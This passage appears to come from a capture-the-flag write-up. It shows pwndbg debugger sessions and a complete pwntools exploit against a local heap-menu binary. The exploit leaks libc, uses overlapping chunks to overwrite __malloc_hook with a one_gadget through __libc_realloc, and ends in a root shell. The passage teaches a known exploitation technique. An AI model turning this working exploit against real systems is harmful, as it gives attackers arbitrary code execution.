03:0018│   0x7f23cef89b08 (__realloc_hook) —▸ 0x7f23cec4aa70 (realloc_hook_ini) ◂— push   r15
04:0020│   0x7f23cef89b10 (__malloc_hook) ◂— 0x0
... ↓
pwndbg> p &__realloc_hook
$2 = (void *(**)(void *, size_t, const void *)) 0x7f23cef89b08 <__realloc_hook>
```
```python
delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
#add(0x120, flat(cyclic(n = 8, length = 0x120)))
add(0x120, flat('a' * 248, 0x71, libc.sym['__malloc_hook'] - 0x23))
add(0x68, 'x' * 10)
#add(0x68, flat('\0' * 0x13, libc.sym['one_gadget']))
pause()
add(0x68, flat('\0' * 11, libc.sym['one_gadget'], libc.sym['__libc_realloc'] + 16))
p.sendlineafter('choice:', '2')
p.sendlineafter(':', str(0xff))
```
```gdb -q -p `pidof pwn` -ex "b *0x400AB8" -ex "c"``
ni magic x/5i... b ... c magic realloc is changed to one_gadget ni... si rsp+0x30 is null`
```
pwndbg> ni
pwndbg> magic
========== function ==========
system:0x453a0
execve:0xcc7f0
open:0xf70f0
read:0xf7310
write:0xf7370
gets:0x6ed90
setcontext+0x35:0x47b85
========== variables ==========
__malloc_hook(0x3c4b10)             : 0x00007feb14f65720
__free_hook(0x3c67a8)               : 0x0000000000000000
__realloc_hook(0x3c4b08)            : 0x00007feb14f2627a
stdin(-0x7feb148def50)              : 0x00007feb152a58e0
stdout(-0x7feb148def60)             : 0x00007feb152a6620
_IO_list_all(0x3c5520)              : 0x00007feb152a6540
__after_morecore_hook(0x3c67a0)     : 0x0000000000000000
pwndbg> x/5i 0x00007feb14f65720
   0x7feb14f65720 <__GI___libc_realloc+16>:	sub    rsp,0x38
   0x7feb14f65724 <__GI___libc_realloc+20>:	mov    rax,QWORD PTR [rip+0x33f8a5]        # 0x7feb152a4fd0
   0x7feb14f6572b <__GI___libc_realloc+27>:	mov    rax,QWORD PTR [rax]
   0x7feb14f6572e <__GI___libc_realloc+30>:	test   rax,rax
   0x7feb14f65731 <__GI___libc_realloc+33>:	jne    0x7feb14f65958 <__GI___libc_realloc+584>
pwndbg> b *0x00007feb14f65720
Breakpoint 2 at 0x7feb14f65720: file malloc.c, line 2981.
pwndbg> c
Continuing.
pwndbg> magic
========== function ==========
system:0x453a0
execve:0xcc7f0
open:0xf70f0
read:0xf7310
write:0xf7370
gets:0x6ed90
setcontext+0x35:0x47b85
========== variables ==========
__malloc_hook(0x3c4b10)             : 0x00007feb14f65720
__free_hook(0x3c67a8)               : 0x0000000000000000
__realloc_hook(0x3c4b08)            : 0x00007feb14f2627a
stdin(-0x7feb148def50)              : 0x00007feb152a58e0
stdout(-0x7feb148def60)             : 0x00007feb152a6620
_IO_list_all(0x3c5520)              : 0x00007feb152a6540
__after_morecore_hook(0x3c67a0)     : 0x0000000000000000
pwndbg> ni
...
   0x7feb14f65724 <realloc+20>     mov    rax, qword ptr [rip + 0x33f8a5]
   0x7feb14f6572b <realloc+27>     mov    rax, qword ptr [rax]
   0x7feb14f6572e <realloc+30>     test   rax, rax
   0x7feb14f65731 <realloc+33>     jne    realloc+584 <realloc+584>
    ↓
   0x7feb14f65958 <realloc+584>    mov    rdx, qword ptr [rsp + 0x68]
 ► 0x7feb14f6595d <realloc+589>    call   rax <do_system+1098>
        rdi: 0xff
        rsi: 0x400a74 (add_item+189) ◂— mov    rdx, rax
        rdx: 0x400e95 (main+222) ◂— jmp    0x400ed3
        rcx: 0xffffffda
pwndbg> si
do_system (line=0x0) at ../sysdeps/posix/system.c:136
136	../sysdeps/posix/system.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────[ REGISTERS ]───────────────────────────────────────
 RAX  0x7feb14f2627a (do_system+1098) ◂— mov    rax, qword ptr [rip + 0x37ec37]
 RBX  0x0
 RCX  0xffffffda
 RDX  0x400e95 (main+222) ◂— jmp    0x400ed3
 RDI  0xff
 RSI  0x400a74 (add_item+189) ◂— mov    rdx, rax
 R8   0x0
 R9   0x1999999999999999
 R10  0x0
 R11  0x7feb150586a0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
 R12  0x4007a0 (_start) ◂— xor    ebp, ebp
 R13  0x7ffdd3b17190 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffdd3b17080 —▸ 0x7ffdd3b170b0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
*RSP  0x7ffdd3b17018 —▸ 0x7feb14f6595f (realloc+591) ◂— mov    rbp, rax
*RIP  0x7feb14f2627a (do_system+1098) ◂— mov    rax, qword ptr [rip + 0x37ec37]
────────────────────────────────────────[ DISASM ]─────────────────────────────────────────
 ► 0x7feb14f2627a <do_system+1098>    mov    rax, qword ptr [rip + 0x37ec37] <0x7feb14f2627a>
   0x7feb14f26281 <do_system+1105>    lea    rdi, [rip + 0x147b8f]
   0x7feb14f26288 <do_system+1112>    lea    rsi, [rsp + 0x30]
   0x7feb14f2628d <do_system+1117>    mov    dword ptr [rip + 0x381209], 0 <0x7feb152a74a0>
   0x7feb14f26297 <do_system+1127>    mov    dword ptr [rip + 0x381203], 0 <0x7feb152a74a4>
   0x7feb14f262a1 <do_system+1137>    mov    rdx, qword ptr [rax]
   0x7feb14f262a4 <do_system+1140>    call   execve <execve>
 
   0x7feb14f262a9 <do_system+1145>    mov    edi, 0x7f
   0x7feb14f262ae <do_system+1150>    call   _exit <_exit>
 
   0x7feb14f262b3                     nop    dword ptr [rax]
   0x7feb14f262b6                     nop    word ptr cs:[rax + rax]
─────────────────────────────────────────[ STACK ]─────────────────────────────────────────
00:0000│ rsp  0x7ffdd3b17018 —▸ 0x7feb14f6595f (realloc+591) ◂— mov    rbp, rax
01:0008│      0x7ffdd3b17020 —▸ 0x7ffdd3b17080 —▸ 0x7ffdd3b170b0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
02:0010│      0x7ffdd3b17028 —▸ 0x4007a0 (_start) ◂— xor    ebp, ebp
03:0018│      0x7ffdd3b17030 —▸ 0x7ffdd3b17190 ◂— 0x1
04:0020│      0x7ffdd3b17038 ◂— 0x0
... ↓
07:0038│      0x7ffdd3b17050 —▸ 0x7ffdd3b17080 —▸ 0x7ffdd3b170b0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
───────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────
 ► f 0     7feb14f2627a do_system+1098
   f 1                0
───────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 20
00:0000│ rsp  0x7ffdd3b17018 —▸ 0x7feb14f6595f (realloc+591) ◂— mov    rbp, rax
01:0008│      0x7ffdd3b17020 —▸ 0x7ffdd3b17080 —▸ 0x7ffdd3b170b0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
02:0010│      0x7ffdd3b17028 —▸ 0x4007a0 (_start) ◂— xor    ebp, ebp
03:0018│      0x7ffdd3b17030 —▸ 0x7ffdd3b17190 ◂— 0x1
04:0020│      0x7ffdd3b17038 ◂— 0x0
... ↓
07:0038│      0x7ffdd3b17050 —▸ 0x7ffdd3b17080 —▸ 0x7ffdd3b170b0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
08:0040│      0x7ffdd3b17058 —▸ 0x400a74 (add_item+189) ◂— mov    rdx, rax
09:0048│      0x7ffdd3b17060 ◂— 0x8d3b17190
0a:0050│      0x7ffdd3b17068 ◂— 0xff
0b:0058│      0x7ffdd3b17070 ◂— 0xa353532 /* '255\n' */
0c:0060│      0x7ffdd3b17078 ◂— 0x672822d853e49a00
0d:0068│ rbp  0x7ffdd3b17080 —▸ 0x7ffdd3b170b0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
0e:0070│      0x7ffdd3b17088 —▸ 0x400e95 (main+222) ◂— jmp    0x400ed3
0f:0078│      0x7ffdd3b17090 ◂— 0x200400ee0
10:0080│      0x7ffdd3b17098 —▸ 0x15f2010 —▸ 0x400896 (hello_message) ◂— push   rbp
11:0088│      0x7ffdd3b170a0 —▸ 0x7ffdd3b10a32 ◂— 0x0
12:0090│      0x7ffdd3b170a8 ◂— 0x672822d853e49a00
13:0098│      0x7ffdd3b170b0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
```
put all together
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = 'critical'
context.binary = './pwn'
elf = context.binary
libc = elf.libc
libc.sym['one_gadget'] = 0x4527a
p = process('./pwn')

def show():
    p.sendlineafter('choice:', '1')

def add(length, name):
    p.sendlineafter('choice:', '2')
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def edit(idx, length, name):
    p.sendlineafter('choice:', '3')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def delete(idx):
    p.sendlineafter('choice:', '4')
    p.sendlineafter(':', str(idx))
    
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
add(0xf0, 'x' * 0x10)
show()
libc.address = u64(p.recvuntil("\x7f")[-6:] + b'\0\0') - 0x3c4b78
print('libc @ {:#x}'.format(libc.address))
assert libc.address & 0xfff == 0
add(0x160, '4' * 0x160)

add(0xf0, 'a' * 0xf0)
add(0x68, 'b' * 0x68)
add(0xf0, 'c' * 0xf0)
add(0x10, 'd' * 0x10)

delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
#add(0x120, flat(cyclic(n = 8, length = 0x120)))
add(0x120, flat('a' * 248, 0x71, libc.sym['__malloc_hook'] - 0x23))
add(0x68, 'x' * 10)
#add(0x68, flat('\0' * 0x13, libc.sym['one_gadget']))
add(0x68, flat('\0' * 11, libc.sym['one_gadget'], libc.sym['__libc_realloc'] + 16))
p.sendlineafter('choice:', '2')
p.sendlineafter(':', str(0xff))

p.interactive()
```
```
libc @ 0x7f6db1efb000
$ id
uid=0(root) gid=0(root) groups=0(root)
```
